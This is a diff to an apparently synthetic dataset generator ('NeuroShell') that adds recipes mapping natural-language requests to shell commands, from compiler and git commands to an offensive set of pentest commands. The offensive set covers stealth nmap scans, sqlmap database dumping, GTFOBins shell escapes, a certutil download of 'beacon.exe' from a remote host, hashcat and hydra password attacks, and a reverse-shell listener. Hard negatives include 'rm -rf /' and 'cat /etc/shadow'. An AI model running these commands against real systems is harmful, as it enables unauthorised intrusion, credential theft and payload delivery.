@@ -917,6 +917,537 @@ RECIPES: list[Recipe] = [
         is_destructive=False,
         explanation="Triggers an orderly rolling restart for pods in the target deployment.",
     ),
+
+    # ── Category 1: Standard Polyglot & Git ──
+    Recipe(
+        action_id="polyglot_compile_cpp20",
+        category="POLYGLOT_DEV",
+        canonical_nl="compile modern C++20 source file with optimizations and warnings",
+        default_cmd="g++ -std=c++20 -O2 -Wall -Wextra {file} -o {out}",
+        powershell_cmd="g++ -std=c++20 -O2 -Wall -Wextra {file} -o {out}.exe",
+        cmd_exe="cl /std:c++20 /EHsc /O2 {file} /Fe:{out}.exe",
+        parameters={
+            "file": ["main.cpp", "server.cpp", "app.cpp", "engine.cpp"],
+            "out": ["app", "server", "main", "binary"],
+        },
+        nl_templates=[
+            "compile modern C++20 source file {file}",
+            "build {file} using g++ with c++20 standard",
+            "compile C++ file {file} to {out} with optimization",
+            "g++ compile {file} with c++20 flags",
+        ],
+        hard_negatives=[
+            "gcc -O2 {file} -o {out}",
+            "clang -c {file}",
+        ],
+        is_destructive=False,
+        explanation="Compiles C++ source with C++20 standard dialect, O2 optimization and all warnings.",
+    ),
+    Recipe(
+        action_id="polyglot_compile_rust",
+        category="POLYGLOT_DEV",
+        canonical_nl="build standalone rust file or cargo project in release mode",
+        default_cmd="cargo build --release",
+        powershell_cmd="cargo build --release",
+        cmd_exe="cargo build --release",
+        nl_templates=[
+            "build cargo project in release mode",
+            "compile rust workspace for production release",
+            "cargo release build",
+            "build optimized rust binary",
+        ],
+        hard_negatives=[
+            "cargo check",
+            "cargo run",
+            "rustc main.rs",
+        ],
+        is_destructive=False,
+        explanation="Builds Rust project with full optimizations for production release.",
+    ),
+    Recipe(
+        action_id="polyglot_run_java_single_file",
+        category="POLYGLOT_DEV",
+        canonical_nl="run single java source file directly without separate compile step",
+        default_cmd="java {file}",
+        powershell_cmd="java {file}",
+        cmd_exe="java {file}",
+        parameters={
+            "file": ["Main.java", "Application.java", "Server.java"],
+        },
+        nl_templates=[
+            "run single java source file {file}",
+            "execute java file {file} directly",
+            "run {file} using java 11+ runner",
+        ],
+        hard_negatives=[
+            "javac {file} && rm {file}",
+            "javap -c {file}",
+        ],
+        is_destructive=False,
+        explanation="Directly launches Java 11+ single-file source code without prior javac compile step.",
+    ),
+    Recipe(
+        action_id="polyglot_build_golang",
+        category="POLYGLOT_DEV",
+        canonical_nl="compile go binary stripped of debug symbols and dwarf tables",
+        default_cmd="go build -ldflags=\"-s -w\" -o {out} {file}",
+        powershell_cmd="go build -ldflags=\"-s -w\" -o {out}.exe {file}",
+        cmd_exe="go build -ldflags=\"-s -w\" -o {out}.exe {file}",
+        parameters={
+            "file": ["main.go", "cmd/server/main.go", "."],
+            "out": ["app", "server", "binary"],
+        },
+        nl_templates=[
+            "compile go binary stripped of debug symbols {file}",
+            "build compact production go executable from {file}",
+            "go build stripped binary to {out}",
+        ],
+        hard_negatives=[
+            "go run {file}",
+            "go test ./...",
+        ],
+        is_destructive=False,
+        explanation="Compiles Go package into stripped lightweight binary with symbol tables removed.",
+    ),
+    Recipe(
+        action_id="git_undo_last_commit_soft",
+        category="GIT",
+        canonical_nl="undo the last commit and keep changes staged in index",
+        default_cmd="git reset --soft HEAD~1",
+        powershell_cmd="git reset --soft HEAD~1",
+        cmd_exe="git reset --soft HEAD~1",
+        nl_templates=[
+            "undo the last commit and keep changes staged",
+            "soft undo last git commit",
+            "uncommit previous commit keeping changes in index",
+            "undo commit without losing staged code",
+            "revert last commit softly",
+        ],
+        hard_negatives=[
+            "git reset --hard HEAD~1",
+            "git commit --amend",
+            "git revert HEAD",
+        ],
+        is_destructive=False,
+        explanation="Rewinds HEAD by one commit while leaving all file modifications staged.",
+    ),
+    Recipe(
+        action_id="git_revert_commit_clean",
+        category="GIT",
+        canonical_nl="safely revert public commit creating inverse change",
+        default_cmd="git revert --no-edit {hash}",
+        powershell_cmd="git revert --no-edit {hash}",
+        cmd_exe="git revert --no-edit {hash}",
+        parameters={
+            "hash": ["HEAD", "HEAD~1", "a1b2c3d"],
+        },
+        nl_templates=[
+            "safely revert public commit {hash}",
+            "create inverse commit to undo {hash}",
+            "git revert commit {hash} without editor prompt",
+        ],
+        hard_negatives=[
+            "git reset --hard {hash}",
+            "git rebase -i {hash}",
+        ],
+        is_destructive=False,
+        explanation="Creates a new commit reversing the changes introduced by target commit.",
+    ),
+    Recipe(
+        action_id="git_reflog_inspect_history",
+        category="GIT",
+        canonical_nl="view git reflog state transitions to recover deleted commits or branches",
+        default_cmd="git reflog -n 15",
+        powershell_cmd="git reflog -n 15",
+        cmd_exe="git reflog -n 15",
+        nl_templates=[
+            "view git reflog to recover lost commits",
+            "show reflog history",
+            "inspect HEAD movements in git reflog",
+            "find deleted commit in reflog",
+        ],
+        hard_negatives=[
+            "git log --oneline",
+            "git status",
+        ],
+        is_destructive=False,
+        explanation="Displays historical HEAD transitions allowing recovery of unreferenced commits.",
+    ),
+    Recipe(
+        action_id="github_delete_repo_cli",
+        category="GIT",
+        canonical_nl="delete remote github repository using gh cli without confirmation prompt",
+        default_cmd="gh repo delete {repo} --yes",
+        powershell_cmd="gh repo delete {repo} --yes",
+        cmd_exe="gh repo delete {repo} --yes",
+        parameters={
+            "repo": ["myuser/test-repo", "org/temp-project"],
+        },
+        nl_templates=[
+            "delete remote github repository {repo}",
+            "gh repo delete {repo} yes",
+            "remove github repository {repo} with gh cli",
+        ],
+        hard_negatives=[
+            "gh repo view {repo}",
+            "git remote remove origin",
+        ],
+        is_destructive=True,
+        explanation="Permanently deletes the specified GitHub repository via GitHub CLI.",
+    ),
+
+    # ── Category 2: Linux & SysAdmin Core ──
+    Recipe(
+        action_id="sysadmin_systemctl_service_restart",
+        category="SYSADMIN_CORE",
+        canonical_nl="restart and inspect systemd service status",
+        default_cmd="systemctl restart {svc} && systemctl status {svc} --no-pager",
+        powershell_cmd="Restart-Service {svc}; Get-Service {svc}",
+        cmd_exe="net stop {svc} && net start {svc}",
+        parameters={
+            "svc": ["nginx", "docker", "ssh", "postgresql", "apache2"],
+        },
+        nl_templates=[
+            "restart and check status of {svc} service",
+            "systemctl restart {svc}",
+            "bounce {svc} daemon and verify state",
+        ],
+        hard_negatives=[
+            "systemctl stop {svc}",
+            "systemctl mask {svc}",
+        ],
+        is_destructive=False,
+        explanation="Restarts the target systemd service and displays current running status.",
+    ),
+    Recipe(
+        action_id="sysadmin_ss_listening_ports",
+        category="SYSADMIN_CORE",
+        canonical_nl="display all listening TCP and UDP sockets with process names",
+        default_cmd="ss -tulpn",
+        powershell_cmd="Get-NetTCPConnection -State Listen",
+        cmd_exe="netstat -ano | findstr LISTENING",
+        nl_templates=[
+            "display all listening TCP and UDP sockets with processes",
+            "show open ports and listening daemons ss",
+            "check which processes are listening on network ports",
+        ],
+        hard_negatives=[
+            "netstat -r",
+            "ip route show",
+        ],
+        is_destructive=False,
+        explanation="Lists all open listening sockets with PID and application names.",
+    ),
+    Recipe(
+        action_id="sysadmin_disk_usage_top_folders",
+        category="SYSADMIN_CORE",
+        canonical_nl="find largest space-consuming directories and files on disk",
+        default_cmd="du -ahx / 2>/dev/null | sort -rh | head -n 20",
+        powershell_cmd="Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 20",
+        cmd_exe="dir C:\\ /s /o-s",
+        nl_templates=[
+            "find largest directories consuming disk space",
+            "show top 20 biggest folders on disk",
+            "du top space consumers",
+        ],
+        hard_negatives=[
+            "df -h",
+            "rm -rf /",
+        ],
+        is_destructive=False,
+        explanation="Traverses filesystem to locate and sort the 20 largest space consumers.",
+    ),
+
+    # ── Category 3: Recon & Scanning ──
+    Recipe(
+        action_id="recon_nmap_syn_stealth",
+        category="RECON_SCANNING",
+        canonical_nl="execute fast SYN stealth port scan with service versions and default scripts",
+        default_cmd="nmap -sS -sV -sC -T4 -v {target}",
+        powershell_cmd="nmap -sS -sV -sC -T4 -v {target}",
+        cmd_exe="nmap -sS -sV -sC -T4 -v {target}",
+        parameters={
+            "target": ["10.10.10.5", "192.168.1.100", "10.0.0.1/24"],
+        },
+        nl_templates=[
+            "execute fast SYN stealth port scan with service versions on {target}",
+            "nmap syn stealth scan {target} with default scripts",
+            "scan all open ports and versions on {target} stealthily",
+        ],
+        hard_negatives=[
+            "ping -c 4 {target}",
+            "traceroute {target}",
+        ],
+        is_destructive=False,
+        explanation="Performs TCP SYN half-open scan with service detection and default NSE scripts.",
+    ),
+    Recipe(
+        action_id="recon_nmap_ping_bypass_pn",
+        category="RECON_SCANNING",
+        canonical_nl="scan target ports skipping ICMP host discovery probe",
+        default_cmd="nmap -Pn -sV -sC -T4 {target}",
+        powershell_cmd="nmap -Pn -sV -sC -T4 {target}",
+        cmd_exe="nmap -Pn -sV -sC -T4 {target}",
+        parameters={
+            "target": ["10.10.10.5", "192.168.1.50"],
+        },
+        nl_templates=[
+            "scan target ports skipping ICMP host discovery on {target}",
+            "nmap scan {target} ignoring ping probes",
+            "run nmap with -Pn on {target}",
+        ],
+        hard_negatives=[
+            "nmap -sn {target}",
+            "nmap -PE {target}",
+        ],
+        is_destructive=False,
+        explanation="Treats all hosts as online by bypassing ICMP echo requests.",
+    ),
+    Recipe(
+        action_id="recon_masscan_fast_sweep",
+        category="RECON_SCANNING",
+        canonical_nl="sweep large subnet for open web ports at 1000 packets per second",
+        default_cmd="masscan -p80,443,8080 {subnet} --rate=1000",
+        powershell_cmd="masscan -p80,443,8080 {subnet} --rate=1000",
+        cmd_exe="masscan -p80,443,8080 {subnet} --rate=1000",
+        parameters={
+            "subnet": ["10.10.10.0/24", "192.168.1.0/24"],
+        },
+        nl_templates=[
+            "sweep subnet {subnet} for web ports using masscan",
+            "masscan port 80 443 on {subnet} at rate 1000",
+            "high-speed masscan port sweep on {subnet}",
+        ],
+        hard_negatives=[
+            "nmap -sP {subnet}",
+            "arp-scan --localnet",
+        ],
+        is_destructive=False,
+        explanation="Asynchronously probes subnet for HTTP/HTTPS ports at 1000 pps.",
+    ),
+
+    # ── Category 4: Web Security & Fuzzing ──
+    Recipe(
+        action_id="web_gobuster_dir_fuzz",
+        category="WEB_SECURITY",
+        canonical_nl="brute-force web directories and file extensions with gobuster",
+        default_cmd="gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
+        powershell_cmd="gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
+        cmd_exe="gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
+        parameters={
+            "url": ["http://10.10.10.5", "http://target.local:8080"],
+        },
+        nl_templates=[
+            "brute-force web directories and files on {url} with gobuster",
+            "gobuster dir scan {url} using common wordlist",
+            "fuzz directories on {url} checking php html txt",
+        ],
+        hard_negatives=[
+            "curl -I {url}",
+            "nikto -h {url}",
+        ],
+        is_destructive=False,
+        explanation="Enumerates hidden URIs and endpoints on HTTP service using multi-threaded brute-forcing.",
+    ),
+    Recipe(
+        action_id="web_ffuf_parameter_fuzz",
+        category="WEB_SECURITY",
+        canonical_nl="discover hidden GET query parameters using ffuf and status code filters",
+        default_cmd="ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
+        powershell_cmd="ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
+        cmd_exe="ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
+        parameters={
+            "url": ["http://10.10.10.5/index.php", "http://target.local/api"],
+        },
+        nl_templates=[
+            "discover hidden GET query parameters on {url} using ffuf",
+            "ffuf fuzz parameters on {url}",
+            "find secret url arguments on {url}",
+        ],
+        hard_negatives=[
+            "sqlmap -u {url}",
+            "ffuf -u {url}/FUZZ",
+        ],
+        is_destructive=False,
+        explanation="Identifies hidden parameter inputs by matching HTTP 200/301 responses.",
+    ),
+    Recipe(
+        action_id="web_sqlmap_dump_dbs",
+        category="WEB_SECURITY",
+        canonical_nl="automatically detect and dump database schemas via sqlmap batch mode",
+        default_cmd="sqlmap -u \"{url}\" --batch --dbs",
+        powershell_cmd="sqlmap -u \"{url}\" --batch --dbs",
+        cmd_exe="sqlmap -u \"{url}\" --batch --dbs",
+        parameters={
+            "url": ["http://10.10.10.5/item.php?id=1", "http://target.local/profile.php?user=admin"],
+        },
+        nl_templates=[
+            "automatically detect and dump database schemas on {url}",
+            "sqlmap batch enum databases on {url}",
+            "test {url} for sql injection and list dbs",
+        ],
+        hard_negatives=[
+            "curl -X POST {url}",
+            "sqlninja -m t",
+        ],
+        is_destructive=False,
+        explanation="Performs automated SQL injection payload testing and enumerates database names.",
+    ),
+
+    # ── Category 5: Privilege Escalation ──
+    Recipe(
+        action_id="privesc_gtfobins_find_exec",
+        category="PRIVESC",
+        canonical_nl="spawn privileged shell via find binary -exec flag",
+        default_cmd="find . -exec /bin/sh \\; -quit",
+        powershell_cmd="find . -exec /bin/sh \\; -quit",
+        cmd_exe="find . -exec /bin/sh \\; -quit",
+        nl_templates=[
+            "spawn privileged shell via find binary -exec flag",
+            "escape to root using find suid",
+            "gtfobins find shell escape",
+        ],
+        hard_negatives=[
+            "find . -name '*.txt'",
+            "which find",
+        ],
+        is_destructive=False,
+        explanation="Executes /bin/sh with the effective permissions of the find binary.",
+    ),
+    Recipe(
+        action_id="privesc_gtfobins_vim_escape",
+        category="PRIVESC",
+        canonical_nl="break out of sudo or restricted shell using vim command execution",
+        default_cmd="sudo vim -c ':!/bin/sh'",
+        powershell_cmd="sudo vim -c ':!/bin/sh'",
+        cmd_exe="sudo vim -c ':!/bin/sh'",
+        nl_templates=[
+            "break out of sudo using vim command execution",
+            "vim sudo shell escape",
+            "gtfobins vim breakout",
+        ],
+        hard_negatives=[
+            "vim /etc/passwd",
+            "cat /etc/shadow",
+        ],
+        is_destructive=False,
+        explanation="Spawns an interactive shell directly from Vim session with elevated sudo rights.",
+    ),
+    Recipe(
+        action_id="privesc_lolbas_certutil_download",
+        category="PRIVESC",
+        canonical_nl="download remote binary payload onto windows target using certutil",
+        default_cmd="certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
+        powershell_cmd="certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
+        cmd_exe="certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
+        parameters={
+            "ip": ["10.10.10.5", "192.168.1.10"],
+            "port": ["8000", "8080", "80"],
+            "file": ["payload.exe", "beacon.exe", "tools.zip"],
+        },
+        nl_templates=[
+            "download remote file {file} using certutil from {ip}:{port}",
+            "certutil urlcache download {file} from {ip}:{port}",
+            "lolbas certutil file fetch {file}",
+        ],
+        hard_negatives=[
+            "Invoke-WebRequest -Uri http://{ip}:{port}",
+            "curl http://{ip}:{port}",
+        ],
+        is_destructive=False,
+        explanation="Leverages native Windows Certificate utility to fetch arbitrary payloads over HTTP.",
+    ),
+
+    # ── Category 6: Password & Cryptography ──
+    Recipe(
+        action_id="cracking_hashcat_ntlm_rockyou",
+        category="CRACKING",
+        canonical_nl="crack NTLM password hashes using hashcat with rockyou wordlist on GPU",
+        default_cmd="hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O",
+        powershell_cmd="hashcat.exe -m 1000 -a 0 hashes.txt rockyou.txt -O",
+        cmd_exe="hashcat.exe -m 1000 -a 0 hashes.txt rockyou.txt -O",
+        nl_templates=[
+            "crack NTLM password hashes using hashcat with rockyou",
+            "hashcat mode 1000 ntlm dictionary attack",
+            "crack windows ntlm hashes on gpu with rockyou",
+        ],
+        hard_negatives=[
+            "john --format=NT hashes.txt",
+            "hashcat -m 0 hashes.txt",
+        ],
+        is_destructive=False,
+        explanation="Performs GPU-accelerated straight dictionary attack on NTLM password hashes (mode 1000).",
+    ),
+    Recipe(
+        action_id="cracking_hydra_ssh_bruteforce",
+        category="CRACKING",
+        canonical_nl="brute-force SSH credentials using hydra and rockyou wordlist",
+        default_cmd="hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
+        powershell_cmd="hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
+        cmd_exe="hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
+        parameters={
+            "user": ["root", "admin", "user"],
+            "target": ["10.10.10.5", "192.168.1.50"],
+        },
+        nl_templates=[
+            "brute-force SSH credentials on {target} as {user} with hydra",
+            "hydra crack ssh login on {target} user {user}",
+            "spray rockyou passwords against ssh on {target}",
+        ],
+        hard_negatives=[
+            "ssh {user}@{target}",
+            "nmap -p 22 {target}",
+        ],
+        is_destructive=False,
+        explanation="Conducts parallelized network authentication brute-force against SSH daemon.",
+    ),
+
+    # ── Category 7: Multi-Step Orchestration ──
+    Recipe(
+        action_id="orchestration_scan_then_fuzz",
+        category="ORCHESTRATION",
+        canonical_nl="chain port scan and automated web directory fuzzing on discovered http ports",
+        default_cmd="nmap -p 80,443 -sV {target} && gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
+        powershell_cmd="nmap -p 80,443 -sV {target}; gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
+        cmd_exe="nmap -p 80,443 -sV {target} && gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
+        parameters={
+            "target": ["10.10.10.5", "192.168.1.100"],
+        },
+        nl_templates=[
+            "chain port scan and automated web directory fuzzing on {target}",
+            "scan web ports on {target} then run gobuster",
+            "coordinate nmap and gobuster discovery on {target}",
+        ],
+        hard_negatives=[
+            "nmap {target}",
+            "gobuster dir -u http://{target}",
+        ],
+        is_destructive=False,
+        explanation="Pipelines initial network discovery directly into web content brute-forcing upon success.",
+    ),
+    Recipe(
+        action_id="orchestration_stage_and_listen",
+        category="ORCHESTRATION",
+        canonical_nl="start background payload staging server and open reverse shell listener",
+        default_cmd="python3 -m http.server {sport} & ncat -lvnp {lport}",
+        powershell_cmd="Start-Process python -ArgumentList '-m http.server {sport}'; ncat -lvnp {lport}",
+        cmd_exe="start python -m http.server {sport} && ncat -lvnp {lport}",
+        parameters={
+            "sport": ["8000", "8080"],
+            "lport": ["4444", "9001"],
+        },
+        nl_templates=[
+            "start background payload staging server and open reverse shell listener",
+            "host payloads on port {sport} and listen on {lport}",
+            "setup staging server on {sport} with netcat listener on {lport}",
+        ],
+        hard_negatives=[
+            "python3 -m http.server {sport}",
+            "ncat -lvnp {lport}",
+        ],
+        is_destructive=False,
+        explanation="Spawns an HTTP staging delivery service in background while keeping foreground listener active.",
+    ),
 ]
 
 
@@ -1030,15 +1561,21 @@ def build_full_corpus(target_total_samples: int = 50000) -> tuple[list[dict], li
 
 
 def main():
+    import argparse
+    parser = argparse.ArgumentParser(description="NeuroShell Synthetic Dataset Generator")
+    parser.add_argument("--samples", type=int, default=50000, help="Target total training pairs (default: 50000)")
+    args = parser.parse_args()
+
     print("=" * 60)
     print("🧠 NeuroShell Synthetic Dataset & Canonical Recipe Generator")
+    print(f"Target Volume: {args.samples:,} samples across {len(RECIPES)} recipes")
     print("=" * 60)
 
     output_dir = Path(__file__).resolve().parent.parent.parent / "data" / "kaggle_dataset"
     output_dir.mkdir(parents=True, exist_ok=True)
 
     print(f"[*] Generating multi-domain corpus for {len(RECIPES)} canonical recipes...")
-    corpus, catalog = build_full_corpus(target_total_samples=50000)
+    corpus, catalog = build_full_corpus(target_total_samples=args.samples)
     print(f"[+] Successfully generated {len(corpus):,} training samples across {len(catalog)} canonical actions.")
 
     # 1. Save training JSONL
